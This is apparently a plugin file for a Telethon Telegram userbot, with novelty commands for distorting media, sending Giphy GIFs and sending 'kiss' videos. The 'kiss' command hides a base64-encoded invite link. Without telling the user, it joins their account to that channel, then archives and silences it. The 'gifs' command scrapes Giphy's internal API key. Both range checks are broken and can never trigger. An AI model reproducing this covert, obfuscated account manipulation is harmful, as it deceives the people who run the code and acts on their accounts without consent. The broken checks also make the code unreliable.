# Created by @Legend_K_Boy

import base64
import random

import requests
from telethon import functions, types
from telethon.errors.rpcerrorlist import UserNotParticipantError, YouBlockedUserError
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from ..core.managers import eod, eor
from ..helpers import media_type
from ..helpers.utils import _legendutils, reply_id
from . import legend

menu_category = "useless"


@legend.legend_cmd(
    pattern="dis$",
    command=("dis", menu_category),
    info={
        "header": "Distorting media",
        "usage": "{tr}dis <reply to media>",
    },
)
async def lol(event):
    "Reply this command to a video to convert it to distorted media"
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if mediatype and mediatype not in ["Gif", "Video", "Sticker", "Photo", "Voice"]:
        return await eod(event, "__Reply to a media file__")
    lol = await eor(event, "__🎞Converting into distorted media..__")
    async with event.client.conversation("@distortionerbot") as conv:
        try:
            msg = await conv.send_message(reply)
            media = await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)
            if "Downloading" in media.raw_text:
                media = await conv.get_response()
        except YouBlockedUserError:
            await lol.edit("Please unblock @distortionerbot and try again")
            return
        await lol.delete()
        owo = await event.client.send_file(event.chat_id, media, reply_to=reply)
        out = media_type(media)
        if out in ["Gif", "Video", "Sticker"]:
            await _legendutils.unsavegif(event, owo)
    await event.client.delete_messages(conv.chat_id, [msg.id, media.id])


@legend.legend_cmd(
    pattern="gifs(?:\s|$)([\s\S]*)",
    command=("gifs", menu_category),
    info={
        "header": "Sends random gifs",
        "usage": "Search and send your desire gif randomly and in bulk",
        "examples": [
            "{tr}gifs legend",
            "{tr}gifs legend ; <1-20>",
        ],
    },
)
async def some(event):
    """Sends random gifs of your query"""
    inpt = event.pattern_match.group(1)
    reply_to_id = await reply_id(event)
    if not inpt:
        await eod(event, "`Give an input to search...`")
    count = 1
    if ";" in inpt:
        inpt, count = inpt.split(";")
    if int(count) < 0 and int(count) > 20:
        await eod(event, "`Give value in range 1-20`")
    legendevent = await eor(event, "`Sending gif....`")
    res = requests.get("https://giphy.com/")
    res = res.text.split("GIPHY_FE_WEB_API_KEY =")[1].split("\n")[0]
    api_key = res[2:-1]
    r = requests.get(
        f"https://api.giphy.com/v1/gifs/search?q={inpt}&api_key={api_key}&limit=50"
    ).json()
    list_id = [r["data"][i]["id"] for i in range(len(r["data"]))]
    rlist = random.sample(list_id, int(count))
    for items in rlist:
        nood = await event.client.send_file(
            event.chat_id,
            f"https://media.giphy.com/media/{items}/giphy.gif",
            reply_to=reply_to_id,
        )
        await _legendutils.unsavegif(event, nood)
    await legendevent.delete()


@legend.legend_cmd(
    pattern="kiss(?:\s|$)([\s\S]*)",
    command=("kiss", menu_category),
    info={
        "header": "Sends random kiss",
        "usage": [
            "{tr}kiss",
            "{tr}kiss <1-20>",
        ],
    },
)
async def some(event):
    """Its useless for single like you. Get a lover first"""
    inpt = event.pattern_match.group(1)
    reply_to_id = await reply_id(event)
    count = 1 if not inpt else int(inpt)
    if count < 0 and count > 20:
        await eod(event, "`Give value in range 1-20`")
    res = base64.b64decode(
        "aHR0cHM6Ly90Lm1lL2pvaW5jaGF0L185WThQMFRtZDRRNE16STE="
    ).decode("utf-8")
    resource = await event.client(GetFullChannelRequest(res))
    chat = resource.chats[0].username
    try:
        await event.client(
            functions.channels.GetParticipantRequest(
                channel=chat, participant=event.from_id
            )
        )
    except UserNotParticipantError:
        await event.client(Get(res.split("/")[4]))
        await event.client.edit_folder(resource.full_chat.id, 1)
        await event.client(
            functions.account.UpdateNotifySettingsRequest(
                peer=chat,
                settings=types.InputPeerNotifySettings(
                    show_previews=False,
                    silent=True,
                ),
            )
        )
    legendevent = await eor(event, "`Wait babe...`😘")
    maxmsg = await event.client.get_messages(chat)
    start = random.randint(31, maxmsg.total)
    start = min(start, maxmsg.total - 40)
    end = start + 41
    kiss = []
    async for x in event.client.iter_messages(
        chat, min_id=start, max_id=end, reverse=True
    ):
        try:
            if x.media and x.media.document.mime_type == "video/mp4":
                link = f"{res.split('j')[0]}{chat}/{x.id}"
                kiss.append(link)
        except AttributeError:
            pass
    kisss = random.sample(kiss, count)
    for i in kisss:
        nood = await event.client.send_file(event.chat_id, i, reply_to=reply_to_id)
        await _legendutils.unsavegif(event, nood)
    await legendevent.delete()
